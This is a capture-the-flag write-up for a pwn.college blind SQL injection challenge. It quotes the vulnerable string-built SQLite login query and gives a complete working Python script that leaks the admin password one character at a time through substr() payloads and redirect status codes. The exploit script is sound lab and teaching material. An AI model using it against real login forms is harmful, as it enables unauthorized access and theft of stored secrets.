# 🛡️ pwn.college SQLi Challenge Writeup — Blind SQL Injection

## 🔍 Challenge Description

We're given a web server running on `http://challenge.localhost:80` which has a login form. The server uses **SQLite** and inserts an `admin` user with the password set to the **flag**, read from `/flag`. 

The server either:
- Returns **302 redirect** if login is successful
- Returns **403 forbidden** if login fails

There is **no output of the query**, and the database (SQLite) cannot execute system commands.

---

## 🧠 Code Analysis and Vulnerability

From the provided source code:

```python
query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{password}'"
````

We see:

* User input is directly inserted into the SQL query (❌ vulnerable to SQL Injection)
* The only way to infer success/failure is via HTTP status code (302 vs. 403)
* The password for `admin` is not known — it's the flag

So, our strategy:

* Inject an SQL condition that checks **one character at a time** of the password using `substr(...)`
* Use the HTTP response to confirm whether the condition is true
* Repeat until we extract the full flag

---

## 🧪 Exploit Script (Blind Boolean SQL Injection)

```python
import requests
import string

url = "http://challenge.localhost"
charset = string.printable  # Optionally reduce this for speed
flag = ""
i = 1

while True:
    found = False
    for c in charset:
        payload = f"admin' AND substr(password, {i}, 1) = '{c}' --"
        r = requests.post(url, data={"username": payload, "password": "x"}, allow_redirects=False)

        if r.status_code == 302:
            flag += c
            print(f"[+] Found character {i}: {c}")
            i += 1
            found = True
            break

    if not found:
        print("[*] No more characters found. Flag extraction complete.")
        break

print("Flag:", flag)
```

---

## 🏁 Result

Running the script reveals the flag one character at a time, using the application's login behavior to leak data indirectly.

---

## ✅ Takeaways

* **Blind SQL Injection** can leak data without visible output — even with just a true/false signal
* Analyzing the code shows where user input is unsafely used
* `substr()` is very effective in character-by-character flag extraction
* Always use **parameterized SQL queries** to avoid these bugs
